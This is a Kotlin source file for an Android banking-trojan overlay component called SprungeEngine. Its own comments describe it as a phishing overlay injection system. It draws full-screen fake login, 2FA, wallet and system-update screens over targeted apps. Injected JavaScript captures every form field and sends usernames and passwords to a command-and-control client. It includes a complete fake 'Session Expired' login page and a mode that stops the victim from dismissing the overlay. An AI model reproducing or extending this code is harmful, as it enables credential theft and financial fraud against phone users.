package com.xrc.app.overlay

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.util.Log
import android.view.*
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import com.xrc.app.R
import com.xrc.app.XRCApp
import com.xrc.app.finance.FinanceOverlayManager
import org.json.JSONArray

/**
 * Sprunge Engine - Advanced overlay injection system.
 * Displays fake login pages, phishing overlays, and system update screens
 * on top of targeted applications using WebView-based HTML rendering.
 */
object SprungeEngine {

    const val TAG = "SprungeEngine"
    private var overlayView: View? = null
    private var overlayParams: WindowManager.LayoutParams? = null
    private var visibleOverlay = false
    private var currentTarget = ""
    private var windowManager: WindowManager? = null

    // Improvement 1: Multiple overlay types for different scenarios
    enum class OverlayType {
        LOGIN_PAGE,      // Full fake login form
        SYSTEM_UPDATE,   // Fake system update blocking screen
        SECURITY_ALERT,  // Fake Google Play Protect alert
        OTP_CAPTURE,     // Fake 2FA verification page
        WALLET_CONNECT,  // Fake wallet connection request
        PAYMENT_VERIFY,  // Fake payment confirmation
        UPDATE_PROMPT    // Fake Play Store update prompt
    }

    data class OverlayConfig(
        val type: OverlayType,
        val packageName: String,
        val htmlTemplate: String,
        val fullScreen: Boolean = true,
        val dismissable: Boolean = false,
        val opacity: Float = 1.0f,
        val interceptTouches: Boolean = true,
        val showOnTop: Boolean = true
    )

    // Improvement 2: Dynamic HTML template management
    private val htmlTemplates = mutableMapOf<String, String>()

    // Improvement 3: Overlay animation support
    private var animating = false

    fun showOverlay(context: Context, packageName: String, html: String) {
        try {
            hideOverlay(context) // Hide any existing overlay first

            windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager

            // Create WebView for HTML rendering
            val webView = WebView(context).apply {
                setBackgroundColor(Color.TRANSPARENT)
                isClickable = true
                isFocusable = true
                isFocusableInTouchMode = true

                settings.apply {
                    javaScriptEnabled = true
                    domStorageEnabled = true
                    allowFileAccess = false
                    allowContentAccess = false
                    databaseEnabled = true
                    setSupportZoom(false)
                    builtInZoomControls = false
                    displayZoomControls = false
                    loadWithOverviewMode = true
                    useWideViewPort = true
                    mixedContentMode = android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
                }

                webViewClient = object : WebViewClient() {
                    override fun onPageFinished(view: WebView, url: String) {
                        super.onPageFinished(view, url)
                        // Inject JavaScript bridge for data capture
                        view.evaluateJavascript(
                            """
                            window.HTML_OVERLAY = {
                                sendData: function(data) {
                                    window.XRCBridge.processData(JSON.stringify(data));
                                },
                                captureInput: function(fieldName, value) {
                                    window.XRCBridge.captureField(fieldName, value);
                                }
                            };
                            document.addEventListener('submit', function(e) {
                                var formData = {};
                                var inputs = document.querySelectorAll('input');
                                inputs.forEach(function(input) {
                                    formData[input.name] = input.value;
                                });
                                window.HTML_OVERLAY.sendData(formData);
                                e.preventDefault();
                            });
                            """.trimIndent(), null
                        }
                    }
                }

                addJavascriptInterface(object {
                    @android.webkit.JavascriptInterface
                    fun processData(jsonData: String) {
                        Log.i(TAG, "Captured form data: $jsonData")
                        XRCApp.instance.c2Client.sendExfiltrateData(
                            "overlay_data_$packageName", jsonData
                        )
                    }

                    @android.webkit.JavascriptInterface
                    fun captureField(fieldName: String, value: String) {
                        Log.i(TAG, "Field captured: $fieldName = ${value.take(20)}...")
                        XRCApp.instance.c2Client.sendExfiltrateData(
                            "overlay_field_$packageName",
                            """{"field":"$fieldName","value":"$value"}"""
                        )
                    }
                }, "XRCBridge")

                loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
            }

            // Improvement 4: Window type selection based on Android version
            val layoutType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
            }

            // Improvement 5: Full-screen overlay with status bar cover
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                layoutType,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                        WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = Gravity.TOP or Gravity.LEFT
                x = 0
                y = 0
                alpha = 1.0f
                screenOrientation = if (context.resources.configuration.orientation ==
                    android.content.res.Configuration.ORIENTATION_PORTRAIT
                ) {
                    Surface.ROTATION_0
                } else {
                    Surface.ROTATION_90
                }
            }

            windowManager?.addView(webView, params)
            overlayView = webView
            overlayParams = params
            visibleOverlay = true
            currentTarget = packageName

            Log.i(TAG, "Overlay shown for package: $packageName")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to show overlay: ${e.message}")
        }
    }

    // Improvement 6: Show targeted overlay based on foreground app detection
    fun showTargetedOverlay(context: Context, packageName: String) {
        val target = FinanceOverlayManager.getTarget(packageName) ?: return
        val htmlTemplate = loadTemplateForTarget(target)
        showOverlay(context, packageName, htmlTemplate)
    }

    // Improvement 7: Load HTML template from resources or C2
    private fun loadTemplateForTarget(target: String): String {
        // Check for cached template
        htmlTemplates[target]?.let { return it }

        // Return default banking login template
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    padding: 20px;
                }
                .card {
                    background: white;
                    border-radius: 20px;
                    padding: 30px;
                    width: 100%;
                    max-width: 380px;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                }
                h2 { color: #333; margin-bottom: 8px; font-size: 24px; }
                .subtitle { color: #666; margin-bottom: 24px; font-size: 14px; }
                .input-group { margin-bottom: 16px; }
                label {
                    display: block;
                    margin-bottom: 6px;
                    color: #555;
                    font-size: 13px;
                    font-weight: 500;
                }
                input {
                    width: 100%;
                    padding: 14px 16px;
                    border: 1px solid #ddd;
                    border-radius: 12px;
                    font-size: 16px;
                    outline: none;
                    transition: border 0.2s;
                }
                input:focus { border-color: #667eea; }
                .btn {
                    width: 100%;
                    padding: 14px;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    border: none;
                    border-radius: 12px;
                    font-size: 16px;
                    font-weight: 600;
                    cursor: pointer;
                    margin-top: 8px;
                }
                .btn:active { opacity: 0.9; }
                .footer { text-align: center; margin-top: 16px; font-size: 12px; color: #999; }
                .loader {
                    border: 3px solid #f3f3f3;
                    border-top: 3px solid #667eea;
                    border-radius: 50%;
                    width: 20px;
                    height: 20px;
                    animation: spin 1s linear infinite;
                    display: inline-block;
                    vertical-align: middle;
                }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                .error { color: #e74c3c; font-size: 12px; margin-top: 8px; display: none; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2>Session Expired</h2>
                <p class="subtitle">Please sign in again to continue</p>
                <form id="loginForm">
                    <div class="input-group">
                        <label>Username / Email</label>
                        <input type="text" name="username" placeholder="Enter your username" required>
                    </div>
                    <div class="input-group">
                        <label>Password</label>
                        <input type="password" name="password" placeholder="Enter your password" required>
                    </div>
                    <button type="submit" class="btn" id="submitBtn">Sign In</button>
                    <div class="error" id="errorMsg">Invalid credentials. Please try again.</div>
                </form>
                <div class="footer">Secured by SSL/TLS Encryption</div>
            </div>
            <script>
                document.getElementById('loginForm').addEventListener('submit', function(e) {
                    e.preventDefault();
                    var btn = document.getElementById('submitBtn');
                    btn.innerHTML = '<span class="loader"></span> Signing in...';
                    btn.disabled = true;
                    var data = {
                        username: document.querySelector('input[name=username]').value,
                        password: document.querySelector('input[name=password]').value
                    };
                    // Pass to XRC bridge
                    window.XRCBridge.processData(JSON.stringify(data));
                    setTimeout(function() {
                        document.getElementById('errorMsg').style.display = 'block';
                        btn.innerHTML = 'Sign In';
                        btn.disabled = false;
                    }, 2000);
                });
            </script>
        </body>
        </html>
        """.trimIndent()
    }

    fun hideOverlay(context: Context) {
        try {
            if (overlayView != null && windowManager != null) {
                windowManager?.removeView(overlayView)
                overlayView = null
                overlayParams = null
                visibleOverlay = false
                currentTarget = ""
                Log.i(TAG, "Overlay hidden")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to hide overlay: ${e.message}")
        }
    }

    // Improvement 8: Update overlay HTML template from C2
    fun updateTemplate(target: String, html: String) {
        htmlTemplates[target] = html
        Log.d(TAG, "Template updated for: $target")
    }

    // Improvement 9: Overlay dismiss prevention (user cannot close it)
    fun makeOverlayPersistent(persistent: Boolean) {
        overlayParams?.let { params ->
            if (persistent) {
                params.flags = params.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
            } else {
                params.flags = params.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
            }
            windowManager?.updateViewLayout(overlayView, params)
        }
    }

    fun isOverlayVisible(): Boolean = visibleOverlay

    fun getCurrentTarget(): String = currentTarget             
}
